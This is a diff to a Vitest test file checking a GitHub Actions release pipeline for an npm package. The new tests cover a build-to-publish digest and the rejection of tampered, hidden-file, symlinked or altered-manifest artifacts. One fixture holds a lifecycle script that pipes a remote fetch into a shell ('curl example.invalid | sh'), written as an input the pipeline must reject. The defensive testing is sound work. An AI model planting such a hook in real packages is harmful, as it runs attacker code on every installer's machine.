@@ -5,7 +5,9 @@
  * publish-wiki-workflow.test.ts; the publish job's shell is run under bash.
  */
 
+import {Buffer} from 'node:buffer'
 import {execFileSync} from 'node:child_process'
+import {createHash} from 'node:crypto'
 import {
   existsSync,
   mkdirSync,
@@ -22,6 +24,7 @@ import process from 'node:process'
 import {afterEach, beforeEach, describe, expect, it} from 'vitest'
 import {parse} from 'yaml'
 
+import {runBuild} from './build-wiki-write-core.ts'
 import {parseToolPins, RELEASE_TOOLS} from './wiki-write-core-release.ts'
 
 interface WorkflowStep {
@@ -36,6 +39,7 @@ interface WorkflowStep {
 
 interface WorkflowJob {
   name?: string
+  outputs?: Record<string, string>
   if?: string
   needs?: string | string[]
   permissions?: Record<string, string>
@@ -215,8 +219,26 @@ describe('release-wiki-write-core.yaml gating', () => {
     expect(upload?.with?.['if-no-files-found']).toBe('error')
   })
 
-  it('verifies the committed dist in build', () => {
-    expect((buildJob?.steps ?? []).map(step => step.run)).toContain('bun run check:wiki-write-core-dist')
+  it('builds the package, checks the committed marker and verifies the tarball in build, staging it for publish', () => {
+    expect((buildJob?.steps ?? []).map(step => step.run)).toContain(
+      'bun scripts/build-wiki-write-core.ts --check --verify --stage "$RUNNER_TEMP/wiki-write-core-package"',
+    )
+  })
+
+  it('uploads the staged package from build, failing when it is missing', () => {
+    const upload = (buildJob?.steps ?? []).find(step => step.uses?.startsWith('actions/upload-artifact@') === true)
+    expect(upload?.with?.name).toBe('wiki-write-core-package')
+    expect(upload?.with?.path).toBe(`${expression('runner.temp')}/wiki-write-core-package`)
+    expect(upload?.with?.['if-no-files-found']).toBe('error')
+  })
+
+  it('stages the package the build job uploads at the path the publish job downloads it to', () => {
+    const download = (publishJob?.steps ?? []).find(step => step.id === 'package-download')
+    expect(download?.uses?.startsWith('actions/download-artifact@')).toBe(true)
+    expect(download?.with).toEqual({
+      name: 'wiki-write-core-package',
+      path: `${expression('runner.temp')}/wiki-write-core-package`,
+    })
   })
 })
 
@@ -261,8 +283,8 @@ describe('release-wiki-write-core.yaml publish job contents', () => {
   })
 
   it('checks npm >= 11.10.0, validates the decision, stages the config, then releases, in that order', () => {
-    const order = ['npm-gate', 'install', 'validate', 'notes', 'stage', 'release'].map(id =>
-      stepIndexById(publishJob, id),
+    const order = ['npm-gate', 'install', 'validate', 'notes', 'package-download', 'package', 'stage', 'release'].map(
+      id => stepIndexById(publishJob, id),
     )
     expect(order).toEqual([...order].sort((a, b) => a - b))
     expect(runOf(stepById(publishJob, 'npm-gate'))).toContain('11.10.0')
@@ -603,6 +625,401 @@ describe('publish: validate release decision (run under bash against a real repo
 
     expect(result.stdout + result.stderr).not.toContain('UNIQUE-TYPE-MARKER')
   })
+})
+
+/**
+ * The digest the build job publishes and the publish job recomputes: sha256 over the listing
+ * `<sha256 of the file>  ./<path>` of every regular file, one per line, in byte order of the path.
+ * Written independently of the workflow's shell so the two cross-check each other.
+ */
+function packageDigest(root: string): string {
+  const files: string[] = []
+  const walk = (directory: string): void => {
+    for (const entry of readdirSync(directory, {withFileTypes: true})) {
+      const path = join(directory, entry.name)
+      if (entry.isDirectory()) walk(path)
+      else if (entry.isFile()) files.push(path.slice(root.length + 1))
+    }
+  }
+  walk(root)
+  files.sort((left, right) => Buffer.compare(Buffer.from(left), Buffer.from(right)))
+  const listing = files
+    .map(
+      file =>
+        `${createHash('sha256')
+          .update(readFileSync(join(root, file)))
+          .digest('hex')}  ./${file}\n`,
+    )
+    .join('')
+  return createHash('sha256').update(listing).digest('hex')
+}
+
+/** The `package_digest() { ... }` function both jobs define, as written in a step's script. */
+function digestFunction(script: string): string {
+  const match = /^ *package_digest\(\) \{\n[\s\S]*?^ *\}$/mu.exec(script)
+  if (match === null) throw new Error('no package_digest function in the step')
+  return match[0].replaceAll(/^ +/gmu, '')
+}
+
+describe('package digest binding between the build and publish jobs', () => {
+  const buildDigestStep = (): WorkflowStep => stepById(buildJob, 'digest')
+
+  it('has the build job expose the digest of the staged package as a job output', () => {
+    expect(buildJob?.outputs).toEqual({'package-digest': expression('steps.digest.outputs.digest')})
+  })
+
+  it('digests after the tarball is verified and before the package is uploaded', () => {
+    const steps = buildJob?.steps ?? []
+    const verifyIndex = steps.findIndex(step => step.run?.includes('--verify') === true)
+    const uploadIndex = steps.findIndex(step => step.uses?.startsWith('actions/upload-artifact@') === true)
+    expect(verifyIndex).toBeGreaterThanOrEqual(0)
+    expect(stepIndexById(buildJob, 'digest')).toBeGreaterThan(verifyIndex)
+    expect(stepIndexById(buildJob, 'digest')).toBeLessThan(uploadIndex)
+  })
+
+  it('passes the build output to the publish install step as an environment variable', () => {
+    expect(stepById(publishJob, 'package').env).toEqual({
+      EXPECTED_PACKAGE_DIGEST: expression('needs.build.outputs.package-digest'),
+    })
+  })
+
+  it('uses the same digest function in both jobs', () => {
+    expect(digestFunction(runOf(stepById(publishJob, 'package')))).toBe(digestFunction(runOf(buildDigestStep())))
+  })
+
+  it('computes the digest the independent implementation computes, over a tree with nested and unusual names', () => {
+    const dir = mkdtempSync(join(tmpdir(), 'release-build-digest-'))
+    try {
+      const staged = join(dir, 'wiki-write-core-package')
+      mkdirSync(join(staged, 'dist', 'a'), {recursive: true})
+      mkdirSync(join(staged, 'dist', 'nested dir'), {recursive: true})
+      writeFileSync(join(staged, 'package.json'), '{}\n')
+      writeFileSync(join(staged, 'dist', 'a.js'), 'a\n')
+      writeFileSync(join(staged, 'dist', 'a', 'b.js'), 'b\n')
+      writeFileSync(join(staged, 'dist', 'nested dir', 'Z-file.js'), 'z\n')
+      writeFileSync(join(staged, 'dist', 'nested dir', 'a-file.js'), 'y\n')
+      const output = join(dir, 'github-output')
+      writeFileSync(output, '')
+
+      const result = runShell(runOf(buildDigestStep()), dir, {RUNNER_TEMP: dir, GITHUB_OUTPUT: output})
+
+      expect(result).toMatchObject({status: 0})
+      expect(readFileSync(output, 'utf8')).toBe(`digest=${packageDigest(staged)}\n`)
+    } finally {
+      rmSync(dir, {recursive: true, force: true})
+    }
+  })
+})
+
+describe('build: digest step refuses a package that has hidden files', () => {
+  it.each([
+    ['a hidden file in dist', ['dist', '.env']],
+    ['a hidden file at the top level', ['.npmrc']],
+    ['a hidden directory', ['dist', '.cache', 'inside.js']],
+    ['a hidden file below a visible directory', ['dist', 'nested', '.keep']],
+  ])('fails loudly on %s, before writing a digest or reaching the upload', (_label, segments) => {
+    const dir = mkdtempSync(join(tmpdir(), 'release-build-hidden-'))
+    try {
+      const staged = join(dir, 'wiki-write-core-package')
+      mkdirSync(join(staged, 'dist', 'nested'), {recursive: true})
+      writeFileSync(join(staged, 'package.json'), '{}\n')
+      writeFileSync(join(staged, 'dist', 'index.js'), 'export {}\n')
+      mkdirSync(join(staged, ...segments.slice(0, -1)), {recursive: true})
+      writeFileSync(join(staged, ...segments), 'x\n')
+      const output = join(dir, 'github-output')
+      writeFileSync(output, '')
+
+      const result = runShell(runOf(stepById(buildJob, 'digest')), dir, {RUNNER_TEMP: dir, GITHUB_OUTPUT: output})
+
+      expect(result.status).not.toBe(0)
+      expect(result.stdout).toContain(
+        '::error::the staged package contains hidden files, which the artifact upload drops:',
+      )
+      expect(result.stdout).toContain(
+        `drops: ${segments.slice(0, segments.findIndex(segment => segment.startsWith('.')) + 1).join('/')}\n`,
+      )
+      expect(readFileSync(output, 'utf8')).toBe('')
+    } finally {
+      rmSync(dir, {recursive: true, force: true})
+    }
+  })
+
+  it('does not mistake a dot inside a file name or the visible stage marker for a hidden entry', () => {
+    const dir = mkdtempSync(join(tmpdir(), 'release-build-visible-'))
+    try {
+      const staged = join(dir, 'wiki-write-core-package')
+      mkdirSync(join(staged, 'dist'), {recursive: true})
+      writeFileSync(join(staged, 'dist', 'gate-contract.json'), '{}\n')
+      writeFileSync(join(staged, 'dist', 'a.b.d.ts'), 'export {}\n')
+      writeFileSync(join(staged, 'wiki-write-core-stage.marker'), 'm\n')
+      const output = join(dir, 'github-output')
+      writeFileSync(output, '')
+
+      expect(
+        runShell(runOf(stepById(buildJob, 'digest')), dir, {RUNNER_TEMP: dir, GITHUB_OUTPUT: output}),
+      ).toMatchObject({status: 0})
+    } finally {
+      rmSync(dir, {recursive: true, force: true})
+    }
+  })
+})
+
+describe('publish: install staged package (run under bash)', () => {
+  const script = runOf(stepById(publishJob, 'package'))
+  const markerName = 'wiki-write-core-stage.marker'
+  let dir: string
+  let staged: string
+  let digest: string
+
+  const committedManifest = {
+    name: '@fro.bot/wiki-write-core',
+    version: '0.0.0-semantic-release',
+    exports: {'.': './src/index.ts', './wiki-lint': './src/wiki-lint.ts', './package.json': './package.json'},
+    files: ['README.md', 'dist', 'package.json'],
+    dependencies: {yaml: '^2.8.3'},
+  }
+  const stagedManifest = {
+    ...committedManifest,
+    exports: {
+      '.': {types: './dist/index.d.ts', import: './dist/index.js'},
+      './wiki-lint': {types: './dist/wiki-lint.d.ts', import: './dist/wiki-lint.js'},
+      './package.json': './package.json',
+    },
+  }
+
+  function install(env: Record<string, string | undefined> = {}): ShellResult {
+    const expected = 'digest' in env ? env.digest : digest
+    return runShell(script, dir, {
+      RUNNER_TEMP: join(dir, 'runner-temp'),
+      ...(expected === undefined ? {} : {EXPECTED_PACKAGE_DIGEST: expected}),
+    })
+  }
+
+  function writeStaged(manifest: unknown): void {
+    mkdirSync(join(staged, 'dist'), {recursive: true})
+    for (const name of ['index', 'wiki-lint']) {
+      writeFileSync(join(staged, 'dist', `${name}.js`), `export const ${name.replace('-', '_')} = 1\n`)
+      writeFileSync(join(staged, 'dist', `${name}.d.ts`), 'export {}\n')
+    }
+    writeFileSync(join(staged, 'package.json'), `${JSON.stringify(manifest)}\n`)
+    writeFileSync(join(staged, 'README.md'), 'readme\n')
+    writeFileSync(join(staged, 'LICENSE.md'), 'license\n')
+    writeFileSync(join(staged, markerName), '@fro.bot/wiki-write-core staged package\n')
+  }
+
+  /** Rewrites the staged tree the way a compromised build job would, digest included. */
+  function stageTampered(manifest: unknown): void {
+    writeStaged(manifest)
+    digest = packageDigest(staged)
+  }
+
+  function expectCheckoutUntouched(): void {
+    expect(existsSync(join(dir, 'packages/wiki-write-core/dist/stale.js'))).toBe(true)
+    expect(readdirSync(join(dir, 'packages/wiki-write-core/dist')).sort()).toEqual(['gate-contract.json', 'stale.js'])
+    expect(JSON.parse(readFileSync(join(dir, 'packages/wiki-write-core/package.json'), 'utf8'))).toEqual(
+      committedManifest,
+    )
+  }
+
+  beforeEach(() => {
+    dir = mkdtempSync(join(tmpdir(), 'release-publish-package-'))
+    staged = join(dir, 'runner-temp', 'wiki-write-core-package')
+    mkdirSync(join(dir, 'packages/wiki-write-core/dist'), {recursive: true})
+    writeFileSync(join(dir, 'packages/wiki-write-core/package.json'), `${JSON.stringify(committedManifest)}\n`)
+    writeFileSync(join(dir, 'packages/wiki-write-core/dist/gate-contract.json'), '{"version":1}\n')
+    writeFileSync(join(dir, 'packages/wiki-write-core/dist/stale.js'), 'stale\n')
+    writeStaged(stagedManifest)
+    digest = packageDigest(staged)
+  })
+
+  afterEach(() => {
+    rmSync(dir, {recursive: true, force: true})
+  })
+
+  it('replaces the checkout manifest and dist with the staged ones and nothing else', () => {
+    const result = install()
+
+    expect(result).toMatchObject({status: 0})
+    const target = join(dir, 'packages/wiki-write-core')
+    expect(JSON.parse(readFileSync(join(target, 'package.json'), 'utf8'))).toEqual(stagedManifest)
+    expect(readdirSync(join(target, 'dist')).sort()).toEqual([
+      'index.d.ts',
+      'index.js',
+      'wiki-lint.d.ts',
+      'wiki-lint.js',
+    ])
+    expect(readdirSync(target).sort()).toEqual(['dist', 'package.json'])
+  })
+
+  it.each([
+    ['modifies a compiled file', () => writeFileSync(join(staged, 'dist', 'index.js'), 'export const evil = 1\n')],
+    ['adds a compiled file', () => writeFileSync(join(staged, 'dist', 'backdoor.js'), 'export const evil = 1\n')],
+    ['removes a compiled file', () => rmSync(join(staged, 'dist', 'wiki-lint.js'))],
+    ['modifies the README', () => writeFileSync(join(staged, 'README.md'), 'tampered\n')],
+    [
+      'modifies the manifest',
+      () =>
+        writeFileSync(
+          join(staged, 'package.json'),
+          `${JSON.stringify({...stagedManifest, dependencies: {yaml: '^2.8.3', evil: '1.0.0'}})}\n`,
+        ),
+    ],
+    ['adds a top-level file', () => writeFileSync(join(staged, 'extra.js'), 'export {}\n')],
+  ])('rejects an artifact changed after the build job digested it: %s', (_label, tamper) => {
+    tamper()
+
+    const result = install()
+
+    expect(result.status).not.toBe(0)
+    expect(result.stdout).toContain('::error::the downloaded package does not match the digest the build job computed')
+    expectCheckoutUntouched()
+  })
+
+  it.each([
+    ['is missing', undefined],
+    ['is empty', ''],
+    ['is not hexadecimal', 'not-a-digest'],
+    ['is too short', 'abc123'],
+    ['is upper case', 'A'.repeat(64)],
+  ])('rejects a digest that %s, before reading the artifact', (_label, expected) => {
+    const result = install({digest: expected})
+
+    expect(result.status).not.toBe(0)
+    expect(result.stdout).toContain('::error::the build job published no package digest')
+    expectCheckoutUntouched()
+  })
+
+  it('rejects a well-formed digest of a different package', () => {
+    const result = install({digest: '0'.repeat(64)})
+
+    expect(result.status).not.toBe(0)
+    expect(result.stdout).toContain('::error::the downloaded package does not match the digest the build job computed')
+    expectCheckoutUntouched()
+  })
+
+  it('rejects an artifact with an extra top-level entry even when the digest covers it', () => {
+    writeFileSync(join(staged, 'extra.js'), 'export {}\n')
+    digest = packageDigest(staged)
+
+    const result = install()
+
+    expect(result.status).not.toBe(0)
+    expect(result.stdout).toContain(
+      '::error::the staged package must hold exactly LICENSE.md, README.md, dist, package.json and the stage marker',
+    )
+    expectCheckoutUntouched()
+  })
+
+  it('rejects an artifact that holds a symlink', () => {
+    symlinkSync('index.js', join(staged, 'dist', 'link.js'))
+
+    const result = install()
+
+    expect(result.status).not.toBe(0)
+    expect(result.stdout).toContain('::error::the staged package must contain no symlink')
+    expectCheckoutUntouched()
+  })
+
+  it.each([
+    ['adds a lifecycle script', {...stagedManifest, scripts: {prepare: 'curl example.invalid | sh'}}],
+    ['adds a dependency', {...stagedManifest, dependencies: {yaml: '^2.8.3', evil: '1.0.0'}}],
+    ['renames the package', {...stagedManifest, name: '@fro.bot/other'}],
+    ['changes the version', {...stagedManifest, version: '9.9.9'}],
+    ['leaves an export pointing at source', {...stagedManifest, exports: committedManifest.exports}],
+    [
+      'points an export outside dist',
+      {...stagedManifest, exports: {'.': {types: './dist/index.d.ts', import: './lib/index.js'}}},
+    ],
+    [
+      'points an export at a file outside dist through a dotdot segment',
+      {
+        ...stagedManifest,
+        exports: {
+          ...stagedManifest.exports,
+          '.': {types: './dist/../README.md', import: './dist/../README.md'},
+        },
+      },
+    ],
+    [
+      'points an export at a dot segment or an empty segment',
+      {
+        ...stagedManifest,
+        exports: {
+          ...stagedManifest.exports,
+          '.': {types: './dist/./index.d.ts', import: './dist//index.js'},
+        },
+      },
+    ],
+    [
+      'points a subpath at a different compiled file',
+      {
+        ...stagedManifest,
+        exports: {
+          ...stagedManifest.exports,
+          './wiki-lint': {types: './dist/index.d.ts', import: './dist/index.js'},
+        },
+      },
+    ],
+    [
+      'adds an export the checkout does not declare',
+      {
+        ...stagedManifest,
+        exports: {...stagedManifest.exports, './extra': {types: './dist/index.d.ts', import: './dist/index.js'}},
+      },
+    ],
+    ['drops an export the checkout declares', {...stagedManifest, exports: {'.': stagedManifest.exports['.']}}],
+    ['drops the exports', {...stagedManifest, exports: {}}],
+  ])('rejects a manifest that %s, even with a matching digest, leaving the checkout untouched', (_label, manifest) => {
+    stageTampered(manifest)
+
+    const result = install()
+
+    expect(result.status).not.toBe(0)
+    expect(result.stdout).toContain(
+      '::error::the staged package manifest is not the checkout manifest with rewritten exports',
+    )
+    expectCheckoutUntouched()
+  })
+
+  it('rejects an export whose target is missing from the staged dist, even with a matching digest', () => {
+    rmSync(join(staged, 'dist', 'wiki-lint.d.ts'))
+    digest = packageDigest(staged)
+
+    const result = install()
+
+    expect(result.status).not.toBe(0)
+    expect(result.stdout).toContain('::error::the staged package is missing ./dist/wiki-lint.d.ts')
+    expectCheckoutUntouched()
+  })
+
+  it('installs a real staged build end to end, with the digest the build job computes', async () => {
+    rmSync(staged, {recursive: true})
+    const realManifest = readRaw('packages/wiki-write-core/package.json')
+    writeFileSync(join(dir, 'packages/wiki-write-core/package.json'), realManifest)
+    await runBuild({checkOnly: true, stageRoot: staged, write: () => {}})
+    const output = join(dir, 'github-output')
+    writeFileSync(output, '')
+    const buildResult = runShell(runOf(stepById(buildJob, 'digest')), dir, {
+      RUNNER_TEMP: join(dir, 'runner-temp'),
+      GITHUB_OUTPUT: output,
+    })
+    expect(buildResult).toMatchObject({status: 0})
+    const buildDigest = /^digest=([0-9a-f]{64})$/mu.exec(readFileSync(output, 'utf8'))?.[1]
+    expect(buildDigest).toBe(packageDigest(staged))
+
+    const result = install({digest: buildDigest})
+
+    expect(result).toMatchObject({status: 0})
+    const target = join(dir, 'packages/wiki-write-core')
+    expect(readFileSync(join(target, 'package.json'), 'utf8')).toBe(readFileSync(join(staged, 'package.json'), 'utf8'))
+    expect(JSON.parse(readFileSync(join(target, 'package.json'), 'utf8'))).toMatchObject({
+      name: '@fro.bot/wiki-write-core',
+      version: '0.0.0-semantic-release',
+    })
+    expect(packageDigest(join(target, 'dist'))).toBe(packageDigest(join(staged, 'dist')))
+    expect(existsSync(join(target, 'dist', 'stale.js'))).toBe(false)
+    expect(readdirSync(target).sort()).toEqual(['dist', 'package.json'])
+  }, 120_000)
 })
 
 describe('publish: stage release config (run under bash)', () => {
